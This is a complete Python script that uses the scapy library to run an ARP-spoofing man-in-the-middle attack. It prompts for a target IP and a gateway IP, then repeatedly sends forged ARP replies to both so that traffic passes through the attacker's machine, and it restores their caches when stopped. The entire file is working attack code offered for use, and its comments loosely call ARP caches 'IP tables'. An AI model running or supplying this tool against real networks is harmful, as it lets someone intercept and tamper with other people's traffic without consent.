#!/usr/bin/env python3
import scapy.all as scapy
import time


# This will get the MAC address of the given IP
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_req
    answer_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc


# This will spoof the IP tables of 2 devices resulting in you ending up in the middle of the connection.
def spoof(target_ip, sender_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip)
    scapy.send(packet, verbose=False)


# This will restore the IP tables of the targeted devices to the way they were before
def restore(target_ip, sender_ip):
    target_mac = get_mac(target_ip)
    sender_mac = get_mac(sender_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip, hwsrc=sender_mac)
    scapy.send(packet, verbose=False)


target_ip = input("Enter the target IP: ")
sender_ip = input("Enter the gateway IP: ")
try:
    count = 2
    while True:
        spoof(target_ip, sender_ip)
        spoof(sender_ip, target_ip)
        print(f"\rPackets send: {count}", end="")
        count += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nSending packets to restore the IP tables")
    restore(target_ip, sender_ip)
    restore(sender_ip, target_ip)
    print("IP tables were restored successfully")